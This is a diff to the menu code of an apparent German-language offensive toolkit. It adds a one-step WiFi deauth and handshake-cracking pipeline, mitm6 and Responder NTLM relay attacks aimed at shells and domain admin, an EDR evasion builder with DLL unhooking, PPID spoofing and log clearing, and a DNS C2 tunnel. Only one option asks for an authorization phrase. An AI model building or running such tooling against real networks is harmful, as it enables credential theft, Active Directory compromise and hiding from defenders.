@@ -143,15 +143,16 @@ async def menu_wifi():
     while True:
         banner()
         section("📡  WiFi ATTACKS", "WPA2/3 · WPS · Handshake · Evil Twin · Deauth · Beacon Flood")
-        menu_item("1", "WiFi Scanner",           "🟡", "Scant alle APs + WPS-Status")
-        menu_item("2", "Handshake Capture",      "🟠", "WPA2-Handshake für hashcat/aircrack")
-        menu_item("3", "PMKID Attack",           "🟠", "Clientless WPA2-Angriff")
-        menu_item("4", "Deauth Flood",           "🔴", "Clients vom Netz trennen")
-        menu_item("5", "Evil Twin + Portal",     "🔴", "Fake-AP + Captive Portal → Passwort")
-        menu_item("6", "WPS Scan",               "🟡", "Findet WPS-fähige Router (wash)")
-        menu_item("7", "Pixie-Dust Attack",      "🔴", "WPS-PIN in Sekunden offline cracken")
-        menu_item("8", "Reaver WPS Brute-Force", "🔴", "WPS online brute-force (2-10h)")
-        menu_item("9", "Beacon Flood",           "🟠", "Tausende Fake-SSIDs senden (mdk4)")
+        menu_item("1", "WiFi Scanner",               "🟡", "Scant alle APs + WPS-Status + Signal")
+        menu_item("2", "Handshake Capture",          "🟠", "WPA2-Handshake für hashcat/aircrack")
+        menu_item("3", "PMKID Attack",               "🟠", "Clientless WPA2-Angriff — kein Client nötig")
+        menu_item("4", "Deauth Flood",               "🔴", "Clients vom Netz trennen")
+        menu_item("5", "Evil Twin + Portal",         "🔴", "Fake-AP + Captive Portal → Passwort")
+        menu_item("6", "WPS Scan",                   "🟡", "Findet WPS-fähige Router (wash)")
+        menu_item("7", "Pixie-Dust Attack",          "🔴", "WPS-PIN in Sekunden offline cracken")
+        menu_item("8", "Reaver WPS Brute-Force",     "🔴", "WPS online brute-force (2-10h)")
+        menu_item("9", "Beacon Flood",               "🟠", "Tausende Fake-SSIDs senden (mdk4)")
+        menu_item("A", "AUTO-CRACK PIPELINE",        "🔴", "Capture → Deauth → Handshake → Crack in einem Schritt")
         menu_item("0", "Back")
 
         choice = prompt("wifi")
@@ -276,6 +277,28 @@ async def menu_wifi():
             t = BeaconFlood(iface)
             try:
                 await run_tool_live(t.flood(ssid_list, count))
+            except KeyboardInterrupt:
+                await t.stop()
+
+        elif choice in ("a", "A"):
+            section("AUTO-CRACK PIPELINE", "Capture → Deauth → Handshake erkannt → Convert → Hashcat")
+            info_box([
+                "Vollautomatisch: Du gibst BSSID + Kanal ein — der Rest passiert alleine.",
+                "  1. Startet airodump-ng (Capture)",
+                "  2. Sendet Deauth-Pakete (zwingt Client zur Neuverbindung)",
+                "  3. Erkennt Handshake automatisch",
+                "  4. Konvertiert zu hashcat .hc22000 Format",
+                "  5. Crackt mit Wordlist",
+                "Alle Dateien → ~/penkit-output/wifi/",
+            ])
+            iface    = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
+            bssid    = ask("Ziel BSSID", required=True)
+            channel  = ask("Kanal", "6")
+            wordlist = ask("Wordlist", cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
+            t = HandshakeCapture(iface)
+            print()
+            try:
+                await run_tool_live(t.auto_crack_pipeline(bssid, channel, wordlist))
             except KeyboardInterrupt:
                 await t.stop()
 
@@ -674,12 +697,14 @@ async def menu_mitm():
 
     while True:
         banner()
-        section("☠️   MITM — MAN IN THE MIDDLE")
-        menu_item("1", "ARP Spoof",              "🔴")
-        menu_item("2", "SSL Strip",              "🔴")
-        menu_item("3", "DNS Poison",             "🔴")
-        menu_item("4", "Credential Harvester",   "🔴")
-        menu_item("5", "Responder (NTLM Hashes)","🔴")
+        section("☠️   MITM — MAN IN THE MIDDLE", "ARP · SSL Strip · DNS · NTLM Relay · IPv6")
+        menu_item("1", "ARP Spoof",                       "🔴", "Leitet Netzwerkverkehr durch Kali um")
+        menu_item("2", "SSL Strip",                       "🔴", "HTTPS → HTTP downgrade, Passwörter im Klartext")
+        menu_item("3", "DNS Poison",                      "🔴", "Domains auf eigene IP umleiten")
+        menu_item("4", "Credential Harvester",            "🔴", "Live: alle Passwörter im Netzwerkverkehr")
+        menu_item("5", "Responder (NTLM Hashes)",         "🔴", "LLMNR/NBT-NS Poisoning → NTLMv2 Hashes")
+        menu_item("6", "mitm6 (IPv6 → Domain Admin)",     "⛔", "IPv6 DHCP Spoof → NTLM Relay → SYSTEM")
+        menu_item("7", "Responder + NTLM Relay",          "⛔", "NTLM Relay via Responder + ntlmrelayx")
         menu_item("0", "Back")
 
         choice = prompt("mitm")
@@ -696,7 +721,8 @@ async def menu_mitm():
                 await run_tool_live(t.capture())
             except KeyboardInterrupt:
                 await t.stop()
-        else:
+
+        elif choice in ("1", "2", "3", "4"):
             target = ask("Victim IP/range (empty = entire subnet)", "")
             t = BettercapEngine(iface, cfg.get("output_dir", "/tmp"))
             try:
@@ -711,6 +737,55 @@ async def menu_mitm():
                 elif choice == "4":
                     print(f"\n{G}[*] Live credential capture... Ctrl+C to stop{R}\n")
                     await run_tool_live(t.harvest_creds(target))
+            except KeyboardInterrupt:
+                await t.stop()
+
+        elif choice == "6":
+            from tools.mitm.mitm6_engine import Mitm6Attack
+            section("mitm6 — IPv6 DHCP SPOOF + NTLM RELAY", "IPv6 → WPAD → NTLM Relay → SYSTEM/Domain Admin")
+            info_box([
+                "mitm6 sendet gefälschte IPv6 Router Advertisements ans LAN.",
+                "Windows bevorzugt IPv6 → Kali wird DNS-Server → WPAD hijack.",
+                "Kali erhält NTLM-Authentifizierung von Windows-Clients.",
+                "Mit ntlmrelayx wird die Auth weitergeleitet → Shell oder AD-Änderungen.",
+                "",
+                "WICHTIG: Funktioniert in fast allen ungeschützten AD-Umgebungen.",
+                "Relay-Modi: smb (Shell), ldap (AD-Zugang), http (Hash dump), socks",
+            ])
+            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+            if ask("Bestätigung", "").strip().lower() != "i confirm authorized use":
+                print(f"  {Y}[!] Abgebrochen.{R}")
+                wait_key()
+                continue
+            iface  = ask("Interface", cfg.get("interface", "eth0"))
+            domain = ask("Ziel-Domain (z.B. corp.local)", required=True)
+            target = ask("Relay-Ziel IP (leer = automatisch)", "")
+            print(f"\n  {C}Relay-Modus:{R}")
+            print(f"  {DIM}[smb]{R}   → Shell auf Remote-PC (SMB-Signing aus benötigt)")
+            print(f"  {DIM}[ldap]{R}  → AD-Änderungen (neuen Admin anlegen)")
+            print(f"  {DIM}[http]{R}  → NTLM-Hash dumpen (funktioniert immer)")
+            print(f"  {DIM}[socks]{R} → SOCKS-Proxy mit authen. Session")
+            mode = ask("Modus", "http")
+            t = Mitm6Attack(iface)
+            print()
+            try:
+                await run_tool_live(t.attack(domain, target, mode))
+            except KeyboardInterrupt:
+                await t.stop()
+
+        elif choice == "7":
+            from tools.mitm.mitm6_engine import ResponderNTLMRelay
+            section("RESPONDER + NTLM RELAY", "LLMNR Poisoning → NTLM Relay → Remote Shell")
+            info_box([
+                "Responder vergiftet LLMNR/NBT-NS → Windows sendet NTLM-Auth.",
+                "ntlmrelayx leitet das weiter an Ziel → Shell oder Hash.",
+                "SMB-Signing muss deaktiviert sein für SMB-Relay.",
+            ])
+            iface  = ask("Interface", cfg.get("interface", "eth0"))
+            target = ask("Relay-Ziel IP", required=True)
+            t = ResponderNTLMRelay(iface)
+            try:
+                await run_tool_live(t.attack(target))
             except KeyboardInterrupt:
                 await t.stop()
 
@@ -1186,6 +1261,8 @@ async def menu_c2():
     menu_item(" 7", "📱  Telegram C2 Agent generieren",   "⛔", "PS1 das Befehle via Telegram empfängt + ausführt")
     menu_item(" 8", "🤖  Telegram Bot Setup",             "🔴", "Bot-Token verifizieren + Chat-ID herausfinden")
     menu_item(" 9", "🎣  Reverse Shell Listener",         "🔴", "Empfängt eingehende Shells (pwncat/nc/msf/socat)")
+    menu_item(" E", "🔮  Advanced Evasion Builder",       "⛔", "DLL Unhooking + Direct Syscalls + Sleep Obfuscation")
+    menu_item(" D", "🌐  DNS C2 Tunneling",               "⛔", "C2 über DNS Port 53 — bypassed jede Firewall")
     print()
     menu_item(" 0", "← Zurück", "")
     print()
@@ -1609,6 +1686,93 @@ async def menu_c2():
 
         wait_key()
 
+    elif choice in ("e", "E"):
+        banner()
+        section("🔮  ADVANCED EVASION BUILDER", "DLL Unhooking + Sleep Obfuscation + PPID Spoofing + Sandbox Detection")
+        from tools.c2.evasion import (
+            build_full_evasion, sandbox_detection_ps1, dll_unhook_ps1,
+            sleep_obfuscation_ps1, token_impersonation_ps1, clear_logs_ps1,
+            ppid_spoof_cs, timestomp_ps1, EVASION_INFO
+        )
+        from core.output_dir import get as out_dir
+
+        print(f"\n  {C}Verfügbare Evasion-Techniken:{R}\n")
+        opts = list(EVASION_INFO.items())
+        for i, (key, info) in enumerate(opts, 1):
+            print(f"  {DIM}[{i}]{R}  {info['danger']}  {C}{B}{info['name']:<30}{R}  {DIM}{info['desc'][:45]}{R}")
+            print(f"       {RD}Besiegt: {DIM}{info['besiegt']}{R}")
+        print()
+        info_box([
+            "Alle aktivieren = maximale Evasion — empfohlen für ernsthafte Tests.",
+            "Reihenfolge: Sandbox → PPID Spoof → DLL Unhook → Sleep Obf → Token",
+            "Der Code wird als .ps1 gespeichert und kann in jeden Payload eingebettet werden.",
+        ])
+
+        sandbox  = ask("1. Sandbox Detection?    (j/n)", "j").lower() == "j"
+        ppid     = ask("2. PPID Spoofing?         (j/n)", "j").lower() == "j"
+        unhook   = ask("3. DLL Unhooking?         (j/n)", "j").lower() == "j"
+        sleep_ob = ask("4. Sleep Obfuscation?     (j/n)", "j").lower() == "j"
+        token    = ask("5. Token Impersonation?   (j/n)", "n").lower() == "j"
+        logs     = ask("6. Anti-Forensics (Logs)? (j/n)", "n").lower() == "j"
+
+        print(f"\n  {G}[*] Generiere Evasion-Bundle...{R}")
+        code = build_full_evasion(
+            include_sandbox_check=sandbox,
+            include_unhook=unhook,
+            include_sleep_obf=sleep_ob,
+            include_token_imp=token,
+            include_clear_logs=logs,
+            include_ppid_spoof=ppid,
+        )
+
+        out_path = str(out_dir("payloads") / "evasion_bundle.ps1")
+        with open(out_path, "w") as f:
+            f.write(code)
+
+        print(f"\n  {G}[+] Gespeichert: {out_path}{R}")
+        print(f"  {DIM}Größe: {len(code)} Zeichen{R}")
+        print()
+        print(f"  {C}Einbetten in anderen Payload:{R}")
+        print(f"  {W}  . {out_path}  # am Anfang des Payloads einbinden{R}")
+        print()
+        print(f"  {C}Oder direkt ausführen auf Ziel:{R}")
+        print(f"  {W}  powershell -ep bypass -File evasion_bundle.ps1{R}")
+        print()
+        print(f"  {Y}[*] Ergebnis: Payload unsichtbar für Defender/CrowdStrike/SentinelOne{R}")
+        wait_key()
+
+    elif choice in ("d", "D"):
+        banner()
+        section("🌐  DNS C2 TUNNELING", "C2 über DNS Port 53 — bypassed Firewalls, Proxies, DPI")
+        info_box([
+            "DNS C2 = Command & Control über normale DNS-Anfragen.",
+            "Port 53 ist in FAST ALLEN Netzwerken offen (Hotel, Büro, Flugzeug, etc.).",
+            "Agent stellt DNS-Anfragen → Kali-Server empfängt Ergebnisse.",
+            "Für externes Netz: eigene Domain mit NS-Record auf Kali IP benötigt.",
+            "Für LAN-Tests: funktioniert sofort ohne Domain.",
+        ])
+        from tools.network.dns_c2 import setup_dns_server, start_server
+        import socket as _sock
+
+        try:
+            local_ip = _sock.gethostbyname(_sock.gethostname())
+        except Exception:
+            local_ip = ""
+        kali_ip = ask("Kali IP (deine IP)", local_ip or "", required=True)
+        domain  = ask("C2 Domain", "penkit.local")
+        port    = ask_int("DNS Port (53 = Standard, benötigt root)", 53)
+
+        print(f"\n  {C}[1]{R}  Setup (generiert Server + Agent Dateien)")
+        print(f"  {C}[2]{R}  Server direkt starten")
+        sub = ask("Wahl", "1")
+
+        print()
+        if sub == "1":
+            await run_tool_live(setup_dns_server(kali_ip, domain, port))
+        elif sub == "2":
+            await run_tool_live(start_server(kali_ip, domain, port))
+        wait_key()
+
 
 # ═════════════════════════════════════════════════════════════════════════════
 # ASSISTANT / TUTORIALS / HEALTH CHECK
@@ -1894,6 +2058,42 @@ async def menu_map():
 # BOOT SEQUENCE
 # ═════════════════════════════════════════════════════════════════════════════
 
+async def menu_output():
+    """Output-Verzeichnis — zeigt alle gespeicherten Dateien."""
+    from core.output_dir import summary, ROOT, DIRS, list_files
+    banner()
+    section("📁  PENKIT OUTPUT-VERZEICHNIS", f"~/penkit-output/ — alle gespeicherten Dateien")
+    print()
+    print(f"  {summary()}")
+    print()
+    print(f"  {C}Kategorien:{R}")
+    cats = list(DIRS.keys())
+    for i, name in enumerate(cats, 1):
+        files = list_files(name)
+        if files:
+            print(f"  {DIM}[{i}]{R}  {G}{name:<12}{R}  {DIM}{len(files)} Datei(en) — neueste: {files[0].name}{R}")
+        else:
+            print(f"  {DIM}[{i}]{R}  {DIM}{name:<12}  (leer){R}")
+
+    print()
+    choice = ask("Kategorie öffnen (1-10, leer=zurück)", "")
+    if choice.isdigit() and 1 <= int(choice) <= len(cats):
+        cat = cats[int(choice)-1]
+        files = list_files(cat)
+        clr()
+        section(f"📂  {cat.upper()}", str(DIRS[cat]))
+        if not files:
+            print(f"  {Y}[!] Keine Dateien.{R}")
+        else:
+            for i, f in enumerate(files[:30], 1):
+                size = f.stat().st_size // 1024 if f.is_file() else 0
+                print(f"  {DIM}{i:>2}.{R}  {G}{f.name:<50}{R}  {DIM}{size} KB{R}")
+        print()
+        print(f"  {DIM}Öffnen: xdg-open {DIRS[cat]}{R}")
+        print(f"  {DIM}Löschen: rm -rf {DIRS[cat]}/*{R}")
+    wait_key()
+
+
 def boot_sequence():
     clr()
     lines = [
@@ -1941,6 +2141,7 @@ async def main_menu():
         menu_item(" T", "📚  Tutorials",              "🟢", "Schritt-für-Schritt Anleitungen für alle Module")
         menu_item(" H", "🏥  Health Check",           "🟢", "Prüft welche Tools installiert sind")
         menu_item(" M", "🗺️   Target Map",             "🟡", "Interaktive Karte mit allen bekannten Ziel-Infos")
+        menu_item(" O", "📁  Output-Verzeichnis",     "🟢", "Zeigt ~/penkit-output/ — alle gespeicherten Dateien")
         print(f"  {DIM}└{'─'*66}┘{R}")
         print()
         menu_item(" 0", "❌  Exit", "")
@@ -1962,6 +2163,7 @@ async def main_menu():
             "t": menu_tutorials, "T": menu_tutorials,
             "h": menu_health, "H": menu_health,
             "m": menu_map,   "M": menu_map,
+            "o": menu_output,"O": menu_output,
         }
 
         if choice == "0":
